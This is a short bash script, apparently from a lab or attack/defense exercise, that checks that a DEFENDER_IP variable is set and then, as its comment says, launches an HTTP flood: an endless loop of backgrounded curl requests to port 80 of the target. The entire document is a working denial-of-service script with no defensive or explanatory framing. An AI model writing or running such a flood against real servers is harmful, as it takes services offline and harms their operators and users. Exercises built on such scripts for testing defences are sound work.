#!/bin/bash

if [ -z "$DEFENDER_IP" ]; then
  echo "DEFENDER_IP is not set"
  exit 1
else
  echo "DEFENDER_IP is set to $DEFENDER_IP"
fi

echo "Starting http flood $DEFENDER_IP"

# Simple HTTP Flood Attack Script
while true; do
  curl http://$DEFENDER_IP:80/ &
done
